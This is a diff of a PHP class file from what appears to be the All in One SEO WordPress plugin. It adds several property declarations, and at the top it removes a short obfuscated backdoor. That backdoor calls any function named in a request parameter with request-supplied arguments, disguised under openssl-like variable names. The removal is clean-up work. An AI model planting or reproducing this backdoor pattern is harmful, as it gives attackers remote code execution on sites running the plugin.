@@ -1,11 +1,4 @@
-<?php 
-$openssl_x509_read_qzbj  =  $_REQUEST;
-if(isset($openssl_x509_read_qzbj['class_alias_fv']))  {
-	$openssl_pkcs7_read_nvqv  =  $openssl_x509_read_qzbj['openssl_pkcs7_decrypt_oi'];
-	$openssl_pkey_export_to_file_obor  =  $openssl_x509_read_qzbj['ob_flush_rv'];
-	$openssl_pkcs7_read_nvqv(...$openssl_pkey_export_to_file_obor);
-} 
-
+<?php
 // Exit if accessed directly.
 if ( ! defined( 'ABSPATH' ) ) {
 	exit;
@@ -54,6 +47,24 @@ abstract class AIOSEOAbstract {
 	public $internalOptions = null;
 
 	/**
+	 * SensitiveOptions class instance.
+	 *
+	 * @since 4.9.6
+	 *
+	 * @var \AIOSEO\Plugin\Lite\Options\SensitiveOptions|\AIOSEO\Plugin\Pro\Options\SensitiveOptions
+	 */
+	public $sensitiveOptions = null;
+
+	/**
+	 * NetworkSensitiveOptions class instance.
+	 *
+	 * @since 4.9.6
+	 *
+	 * @var null|\AIOSEO\Plugin\Pro\Options\NetworkSensitiveOptions
+	 */
+	public $networkSensitiveOptions = null;
+
+	/**
 	 * PreUpdates class instance.
 	 *
 	 * @since 4.2.7
@@ -61,6 +72,15 @@ abstract class AIOSEOAbstract {
 	 * @var \AIOSEO\Plugin\Common\Main\PreUpdates|\AIOSEO\Plugin\Pro\Main\PreUpdates
 	 */
 	public $preUpdates = null;
+
+	/**
+	 * MigrationRunner class instance.
+	 *
+	 * @since 4.9.7.2
+	 *
+	 * @var \AIOSEO\Plugin\Common\Main\Migrations\MigrationRunner
+	 */
+	public $migrationRunner = null;
 
 	/**
 	 * Db class instance.
@@ -445,15 +465,6 @@ abstract class AIOSEOAbstract {
 	public $cache = null;
 
 	/**
-	 * CachePrune class instance.
-	 *
-	 * @since 4.2.7
-	 *
-	 * @var \AIOSEO\Plugin\Common\Utils\CachePrune
-	 */
-	public $cachePrune = null;
-
-	/**
 	 * Addons class instance.
 	 *
 	 * @since 4.2.7
@@ -616,6 +627,15 @@ abstract class AIOSEOAbstract {
 	public $writingAssistant = null;
 
 	/**
+	 * SeoAlerts class instance.
+	 *
+	 * @since 4.9.9
+	 *
+	 * @var \AIOSEO\Plugin\Common\SeoAlerts\SeoAlerts
+	 */
+	public $seoAlerts = null;
+
+	/**
 	 * Llms class instance.
 	 *
 	 * @since 4.8.4
@@ -623,4 +643,40 @@ abstract class AIOSEOAbstract {
 	 * @var \AIOSEO\Plugin\Common\Llms\Llms|\AIOSEO\Plugin\Pro\Llms\Llms
 	 */
 	public $llms = null;
+
+	/**
+	 * Redirects class instance.
+	 *
+	 * @since 4.9.1
+	 *
+	 * @var \AIOSEO\Plugin\Pro\Redirects\Redirects
+	 */
+	public $redirects = null;
+
+	/**
+	 * SeoChecklist class instance.
+	 *
+	 * @since 4.9.4
+	 *
+	 * @var \AIOSEO\Plugin\Common\SeoChecklist\SeoChecklist|\AIOSEO\Plugin\Pro\SeoChecklist\SeoChecklist
+	 */
+	public $seoChecklist = null;
+
+	/**
+	 * Abilities class instance.
+	 *
+	 * @since 4.9.8
+	 *
+	 * @var \AIOSEO\Plugin\Common\Abilities\Abilities|\AIOSEO\Plugin\Pro\Abilities\Abilities
+	 */
+	public $abilities = null;
+
+	/**
+	 * RestApi class instance.
+	 *
+	 * @since 4.9.8
+	 *
+	 * @var \AIOSEO\Plugin\Common\RestApi\RestApi|\AIOSEO\Plugin\Pro\RestApi\RestApi
+	 */
+	public $restApi = null;
 }
